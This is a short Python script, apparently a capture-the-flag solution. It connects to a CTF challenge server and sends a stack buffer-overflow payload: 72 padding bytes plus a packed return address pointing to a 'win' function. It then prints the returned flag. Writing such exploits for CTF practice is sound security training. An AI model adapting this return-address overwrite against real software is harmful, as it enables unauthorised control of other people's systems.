import socket
import struct

HOST = "ctf.ac.upt.ro"
PORT = 9186 # replace with remote port if attempeted
WIN_ADDR = 0x401196

offset = 72
payload  = b"A" * offset
payload += struct.pack("<Q", WIN_ADDR)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    data = s.recv(1024)
    print("[*] Received:", data.decode(errors="ignore"))
    print("[*] Sending payload...")
    s.sendall(payload + b"\n")
    flag = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            flag += chunk
    except:
        pass

    print("[*] Flag output:\n", flag.decode(errors="ignore"))